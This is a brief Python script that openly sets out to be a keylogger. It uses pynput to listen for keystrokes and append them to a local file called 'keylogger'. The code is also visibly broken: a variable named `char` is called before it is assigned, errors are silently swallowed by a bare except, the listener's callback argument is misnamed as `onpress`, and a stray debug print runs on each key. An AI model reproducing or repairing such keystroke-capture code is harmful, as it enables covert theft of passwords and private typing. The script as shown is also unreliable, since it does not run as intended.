from pynput import keyboard
def keypressed(key):
    print("ssss"+str(key))
    with open ('keylogger','a') as keylog:
        try:
            char =char(key)
            keylog.write(char)
        except:
            print("error")
if __name__=='__main__':
    listener=keyboard.Listener(onpress=keypressed)
    listener.start()
    input()